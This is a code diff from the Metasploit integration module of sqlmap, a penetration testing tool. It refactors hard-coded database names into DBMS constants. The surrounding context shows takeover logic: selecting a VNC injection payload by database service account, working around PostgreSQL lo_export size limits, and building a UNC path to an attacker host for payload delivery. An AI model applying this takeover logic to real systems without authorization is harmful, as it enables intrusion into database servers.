@@ -32,6 +32,7 @@ from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.exception import sqlmapDataException
 from lib.core.exception import sqlmapFilePathException
+from lib.core.settings import DBMS
 from lib.core.subprocessng import blockingReadFromFD
 from lib.core.subprocessng import blockingWriteToFD
 from lib.core.subprocessng import pollProcess
@@ -185,13 +186,13 @@ class Metasploit:
         if __payloadStr == "windows/vncinject":
             choose = False
 
-            if kb.dbms == "MySQL":
+            if kb.dbms == DBMS.MYSQL:
                 debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                 debugMsg += "user, it is likely that the the VNC "
                 debugMsg += "injection will be successful"
                 logger.debug(debugMsg)
 
-            elif kb.dbms == "PostgreSQL":
+            elif kb.dbms == DBMS.POSTGRESQL:
                 choose = True
 
                 warnMsg  = "by default PostgreSQL on Windows runs as "
@@ -199,7 +200,7 @@ class Metasploit:
                 warnMsg += "injection will be successful"
                 logger.warn(warnMsg)
 
-            elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
+            elif kb.dbms == DBMS.MSSQL and kb.dbmsVersion[0] in ( "2005", "2008" ):
                 choose = True
 
                 warnMsg  = "it is unlikely that the VNC injection will be "
@@ -228,12 +229,12 @@ class Metasploit:
                         break
 
                     elif choice == "1":
-                        if kb.dbms == "PostgreSQL":
+                        if kb.dbms == DBMS.POSTGRESQL:
                             logger.warn("beware that the VNC injection might not work")
 
                             break
 
-                        elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
+                        elif kb.dbms == DBMS.MSSQL and kb.dbmsVersion[0] in ( "2005", "2008" ):
                             break
 
                     elif not choice.isdigit():
@@ -553,7 +554,7 @@ class Metasploit:
             # This is useful for sqlmap because on PostgreSQL it is not
             # possible to write files bigger than 8192 bytes abusing the
             # lo_export() feature implemented in sqlmap.
-            if kb.dbms == "PostgreSQL":
+            if kb.dbms == DBMS.POSTGRESQL:
                 self.__fileFormat = "exe-small"
             else:
                 self.__fileFormat = "exe"
@@ -655,7 +656,7 @@ class Metasploit:
         self.__forgeMsfConsoleResource()
         self.__forgeMsfConsoleCmd()
 
-        if kb.dbms in ( "MySQL", "PostgreSQL" ):
+        if kb.dbms in ( DBMS.MYSQL, DBMS.POSTGRESQL ):
             self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self.__randFile)
         else:
             self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self.__randFile)
